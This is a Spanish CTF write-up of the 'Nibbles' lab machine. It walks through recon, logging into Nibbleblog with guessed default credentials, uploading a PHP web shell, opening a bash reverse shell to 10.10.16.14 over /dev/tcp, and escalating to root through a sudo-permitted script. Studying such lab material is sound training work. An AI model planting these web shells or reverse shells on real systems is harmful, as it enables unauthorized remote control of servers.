Lo primero será hacer los reconocimientos de siempre:
![[Pasted image 20221222023355.png]]
![[Pasted image 20221222023359.png]]
![[Pasted image 20221222023402.png]]
![[Pasted image 20221222023407.png]]
Esto es lo que nos encontramos si accedemos al navegador:
![[Pasted image 20221222023414.png]]
Si miramos el código fuente nos encontramos con esto, diciendo que hay un directorio oculto:
![[Pasted image 20221222023420.png]]
Por tanto vamos a acceder a él:
![[Pasted image 20221222023426.png]]
Y tenemos esto que nos dice powered by nibbleblog:
![[Pasted image 20221222023432.png]]
Por tanto vamos a buscar exploits con searchsploit, donde vemos que hay 2:
![[Pasted image 20221222023439.png]]
También podemos hacer fuzzing en esta nueva dirección tanto con wfuzz como con dirb, y veremos como tenemos varias cosas interesantes, entre ellas un apartado de admin y de content, donde posiblemente podamos acceder posteriormente para ejecutar los archivos maliciosos subidos a la máquina víctima:[[WFUZZ]]
![[Pasted image 20221222023446.png]]
Vamos a entrar en admin:
![[Pasted image 20221222023453.png]]
Y en este panel de autenticación podemos probar en utilizar hydra para hacer un ataque de fuerza bruta:[[2 - Hydra - Ataque de Fuerza Bruta contra panel de login web]]
![[Pasted image 20230321130225.png]]
Y nos encuentra muchas credenciales:
![[Pasted image 20230321130247.png]]
Pero si probamos alguna de estas, por ejemplo la password lovely, nos va a dar un error porque esta web cuenta con un sistema de protección contra ataques de fuerza bruta:
![[Pasted image 20230321130347.png]]
Por tanto, tendremos que buscar por internet credenciales por defecto en nibbleblog, veremos como el usuario es admin, y luego probamos en la contraseña el nombre de la máquina (nibbles):
![[Pasted image 20221222023501.png]]
Y ya estamos dentro:
![[Pasted image 20221222023507.png]]
Tenemos un apartado de subir archivos (my image), por tanto vamos a subir un php malicioso que nos permita ejecutar comandos remotamente:
![[Pasted image 20221222023514.png]]
Creamos el php malicioso: [[0 - Consideraciones Previas#Código PHP malicioso para ganar Reverse Shell]]
```python
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
Lo subimos a la web y después accederemos al archivo dentro del directorio content, que también lo encontramos antes con wfuzz; y tras navegar por los directorios encontramos un archivo image.php que intuimos que es el que subimos:
![[Pasted image 20221222023527.png]]
Una vez subido, en la dirección ponemos ?cmd=whoami y se nos ejecutará este comando:
![[Pasted image 20221222023533.png]]
Ahora que tenemos ejecución remota de comandos, podemos mandarnos una reverse shell, por tanto vamos a url encodear el comando de la reverse shell con burpsuite para que nos funcione correctamente:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.14/443 0>&1'
```
![[Pasted image 20221222023541.png]]
Y nos ponemos a escuchar con netcat:
![[Pasted image 20221222023549.png]]
Y pegamos el comando encodeado en el navegador:
![[Pasted image 20221222023554.png]]
Y ya tenemos la reverse shell:
![[Pasted image 20221222023600.png]]
Y navegando por los directorios obtenemos la flag:
![[Pasted image 20221222023606.png]]
Ahora para escalar privilegios, si ejecutamos el comando sudo -l, vemos que podemos ejecutar un script que se llama monitor.sh:
![[Pasted image 20221222025948.png]]
Pero vemos que para ejecutar este script tenemos que sacarlo del archivo comprimido de donde se encuentra:
![[Pasted image 20221222030154.png]]
Para sacarlo utilizamos el comando unzip:
![[Pasted image 20221222030223.png]]
Y ahora ya podemos acceder a su interior y llegamos al script:
![[Pasted image 20221222030302.png]]
Ahora vamos a añadir este fragmento de código al script para que al ejecutarlo nos lande una shell como root:
![[Pasted image 20230315114911.png]]
Otorgamos permisos de ejecución:
![[Pasted image 20221222032304.png]]
Lo lanzamos y deberíamos ser root:
![[Pasted image 20221222032352.png]]
![[Pasted image 20230315114933.png]]

